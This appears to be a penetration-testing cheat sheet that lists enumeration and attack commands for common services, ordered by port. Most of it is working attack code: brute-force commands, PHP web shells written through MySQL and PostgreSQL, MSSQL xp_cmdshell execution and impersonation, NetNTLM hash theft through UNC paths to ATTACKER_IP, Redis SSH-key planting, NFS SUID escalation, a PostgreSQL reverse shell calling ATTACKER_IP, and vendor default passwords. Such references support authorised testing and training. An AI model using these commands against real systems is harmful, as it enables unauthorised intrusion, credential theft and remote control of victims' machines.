---
tags: [recon, no-creds, got-creds, smb, ssh, ftp, smtp, mssql, mysql, ldap, redis, nfs, snmp, rdp, winrm, ipmi]
---

# Service Enumeration

Reference by port number. Run nmap script scans first, then use these commands.

> **Chains:** Creds found → [00_master_checklist.md Phase 4](./00_master_checklist.md) — spray immediately | Shell obtained → [04_linux_privesc.md](./04_linux_privesc.md) / [05_windows_privesc.md](./05_windows_privesc.md) | AD ports (88/389/445 + DC) → [06_active_directory.md](./06_active_directory.md) | Internal service only accessible from pivot → [07_pivoting.md](./07_pivoting.md)

---

## FTP (21)

```bash
# Nmap scripts
nmap -Pn -sV -p 21 --script="ftp*" $TARGET

# Anonymous login
ftp $TARGET
# username: anonymous
# password: anonymous (or blank)

# Check for anonymous write
ftp $TARGET
put test.txt

# Brute force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$TARGET
medusa -h $TARGET -U users.txt -P passwords.txt -M ftp

# Browse with no password prompt
lftp $TARGET
lftp -e "set ftp:ssl-allow no; ls; exit" $TARGET

# Recursive download of all files
wget -r --no-passive ftp://anonymous:@$TARGET/
```

---

## SSH (22)

```bash
# Banner grab
nc -nnv $TARGET 22
ssh -v $TARGET 2>&1 | head -20

# Check allowed auth methods
nmap -Pn -p 22 --script ssh-auth-methods $TARGET

# Try found credentials
ssh user@$TARGET
ssh -i id_rsa user@$TARGET

# Brute force (careful — lockout risk)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4
medusa -h $TARGET -U users.txt -P passwords.txt -M ssh

# Known weak key exploit
python3 ssh-checker.py  # debian openssl weak key
```

Note: SSH is rarely the initial vector — save it for when you have credentials.

---

## SMTP (25 / 587 / 465)

```bash
# Banner + manual enum
nc -nnv $TARGET 25
telnet $TARGET 25

# User enumeration
VRFY root
VRFY admin
RCPT TO: <root@localhost>
EXPN administrators

# Automated user enum
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $TARGET
smtp-user-enum -M RCPT -U users.txt -t $TARGET

# Nmap scripts
nmap -Pn -p 25 --script smtp-enum-users,smtp-commands $TARGET

# Send test email (open relay test)
swaks --to victim@example.com --from attacker@attacker.com --server $TARGET
```

---

## DNS (53)

```bash
# Zone transfer
dig axfr @$TARGET $DOMAIN
host -l $DOMAIN $TARGET

# Reverse lookup
dig -x $TARGET_IP @$TARGET

# Subdomain brute
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
dnsrecon -d $DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

## SMB (139 / 445)

```bash
# Null session check
smbclient -L //$TARGET/ -U '' -N
smbclient -L //$TARGET/ -U '' -N --option='client min protocol=NT1'

# List shares + permissions
smbmap -H $TARGET
smbmap -H $TARGET -u '' -p ''
smbmap -H $TARGET -u 'guest' -p ''

# Full enumeration
enum4linux -a $TARGET
enum4linux-ng $TARGET

# Connect to share
smbclient //$TARGET/ShareName -U '' -N
smbclient //$TARGET/ShareName -U 'user%password'

# Recursive download
smbclient //$TARGET/ShareName -N -c 'prompt; recurse; mget *'

# Nmap vuln scripts (EternalBlue MS17-010, etc.)
nmap -Pn -p 445 --script smb-vuln* $TARGET
nmap -Pn -p 445 --script smb-security-mode,smb-os-discovery $TARGET

# RPC null session
rpcclient -U "" -N $TARGET
rpcclient> srvinfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo
rpcclient> netshareenum

# CrackMapExec / netexec (nxc is the new name on Kali 2024+, same syntax)
crackmapexec smb $TARGET   # or: nxc smb $TARGET
crackmapexec smb $TARGET -u '' -p ''
crackmapexec smb $TARGET -u 'guest' -p ''
crackmapexec smb $TARGET -u user -p password --shares
```

---

## SNMP (161 UDP)

```bash
# Brute community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET

# Walk (public is default)
snmpwalk -c public -v1 -t 10 $TARGET
snmpwalk -c public -v2c $TARGET

# Formatted
snmp-check $TARGET -c public

# Windows-specific OIDs
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25   # Local users
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2  # Processes
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.6.13.1.3    # Open TCP ports
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

---

## LDAP (389 / 636 / 3268)

```bash
# Anonymous bind
ldapsearch -H ldap://$TARGET -x -b "" -s base namingContexts
ldapsearch -H ldap://$TARGET -x -b "DC=domain,DC=local" -s sub "(objectClass=*)" | grep -iE "sAMAccountName|description|mail|memberOf"

# Dump everything (anonymous)
ldapdomaindump -u '' $TARGET

# With credentials
ldapsearch -H ldap://$TARGET -x -D "cn=admin,dc=domain,dc=local" -w password -b "dc=domain,dc=local"
```

---

## NFS (2049)

```bash
# List exports
showmount -e $TARGET

# Mount
sudo mkdir /mnt/nfs
sudo mount -o rw,vers=2 $TARGET:/share /mnt/nfs
sudo mount -t nfs $TARGET:/share /mnt/nfs

# Check no_root_squash (can create SUID root binary)
cat /etc/exports | grep no_root_squash
# If found:
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
# On target:
/share/bash -p
```

---

## MySQL (3306)

```bash
# Connect
mysql -h $TARGET -u root
mysql -h $TARGET -u root -p
mysql -h $TARGET -u root -p''

# Once in:
show databases;
use mysql;
select user,password from mysql.user;
select user,host,authentication_string from mysql.user;

# File read (if FILE privilege)
select load_file('/etc/passwd');

# File write (if writable path known)
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```

---

## MSSQL (1433)

```bash
# Connect
mssqlclient.py -db msdb 'DOMAIN/user:password@$TARGET'
mssqlclient.py -db msdb -windows-auth 'DOMAIN/user:password@$TARGET'

# Nmap enum
nmap -Pn -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info $TARGET

# Once in:
SELECT name FROM master..sysdatabases;
SELECT sp.name, sl.password_hash FROM sys.server_principals sp JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id;

# Check current role and permissions
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

# Escalate via impersonation (if not already sysadmin)
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
-- If sa or another sysadmin appears:
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = success, now proceed to xp_cmdshell
-- REVERT; to drop impersonation

# RCE via xp_cmdshell (requires sysadmin — use impersonation above if needed)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- → Shell via xp_cmdshell: use [08_reverse_shells.md](./08_reverse_shells.md) Windows payloads → [05_windows_privesc.md](./05_windows_privesc.md)
-- → SQL Server service accounts almost always have SeImpersonatePrivilege → GodPotato/PrintSpoofer → SYSTEM → [06_active_directory.md MSSQL section]
```

```sql
-- Linked servers (pivot through MSSQL to reach other DB servers)
SELECT * FROM sys.servers;
EXEC sp_linkedservers;

-- Execute query on linked server
EXEC ('SELECT name FROM master..sysdatabases') AT [linkedserver\instance]

-- Enable xp_cmdshell on linked server and run command
EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE;
       EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;
       EXEC xp_cmdshell ''whoami''') AT [linkedserver\instance]

-- Steal NetNTLM hash via UNC path (combine with Responder on ATTACKER_IP)
EXEC xp_dirtree '\\ATTACKER_IP\share';
EXEC xp_fileexist '\\ATTACKER_IP\share\test';
```

---

## RDP (3389)

```bash
# Check if open + version
nmap -Pn -p 3389 --script rdp-enum-encryption $TARGET

# Connect
xfreerdp /u:user /p:password /v:$TARGET
xfreerdp /u:Administrator /pth:NTLM_HASH /v:$TARGET  # pass-the-hash

# MS12-020 DoS check (NOT BlueKeep — different CVE)
nmap -Pn -p 3389 --script rdp-vuln-ms12-020 $TARGET
# BlueKeep (CVE-2019-0708) — no reliable nmap script; use Metasploit scanner:
# use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

---

## WinRM (5985 / 5986)

```bash
# Check
nmap -Pn -p 5985,5986 $TARGET

# Connect (Linux)
evil-winrm -i $TARGET -u user -p password
evil-winrm -i $TARGET -u Administrator -H NTLM_HASH

# Check with crackmapexec / nxc
crackmapexec winrm $TARGET -u user -p password   # or: nxc winrm $TARGET -u user -p password
```

---

## Redis (6379)

```bash
redis-cli -h $TARGET
redis-cli -h $TARGET ping
redis-cli -h $TARGET info
redis-cli -h $TARGET config get dir
redis-cli -h $TARGET keys '*'

# Write SSH key if writable .ssh dir
config set dir /root/.ssh
config set dbfilename authorized_keys
set crackit "\n\nssh-rsa AAAA...your-key...\n\n"
save
```

---

## Oracle TNS (1521)

```bash
tnscmd10g version -h $TARGET
tnscmd10g status -h $TARGET
oscanner -s $TARGET -P 1521
nmap -Pn -p 1521 --script oracle-tns-version $TARGET
```

---

## PostgreSQL (5432)

```bash
psql -h $TARGET -U postgres
PGPASSWORD=postgres psql -h $TARGET -U postgres

# Read files
CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;

# Write files
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# Password hashes
SELECT usename, passwd FROM pg_shadow;
```

```sql
-- RCE via COPY TO PROGRAM (PostgreSQL 9.3+, requires superuser)
COPY (SELECT '') TO PROGRAM 'id';

-- Reverse shell via COPY TO PROGRAM
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"';

-- Check if superuser (required for COPY TO PROGRAM)
SELECT current_user, usesuper FROM pg_user WHERE usename=current_user;
```

> **→** COPY TO PROGRAM shell → [08_reverse_shells.md](./08_reverse_shells.md) → upgrade → [04_linux_privesc.md](./04_linux_privesc.md)

---

## IPMI (623 UDP)

**Look for:** Port 623 UDP open. IPMI = Intelligent Platform Management Interface — out-of-band server management. Commonly misconfigured with default credentials or vulnerable to cipher 0 auth bypass.

**What to watch for:** Default credentials per vendor, and the cipher 0 vulnerability which allows hash retrieval without valid auth.

```bash
# Detect
sudo nmap -Pn -sU -p 623 --script ipmi-version $TARGET

# Cipher 0 hash dump (no credentials needed on vulnerable systems)
# Google: "ipmi cipher 0 hash dump metasploit"
# MSF: use auxiliary/scanner/ipmi/ipmi_dumphashes
# Crack hashes: hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt

# Default credentials to try manually
# Supermicro:  ADMIN / ADMIN
# Dell iDRAC:  root / calvin
# HP iLO:      Administrator / <serial number on chassis>
# IBM IMM:     USERID / PASSW0RD
```

**Google:** `IPMI cipher 0 vulnerability` / `IPMI default credentials` / `ipmitool hash dump`

---

## VNC (5900)

```bash
# Nmap
nmap -Pn -p 5900-5910 --script vnc-info,vnc-brute $TARGET

# Connect
vncviewer $TARGET

# Brute
hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET
```
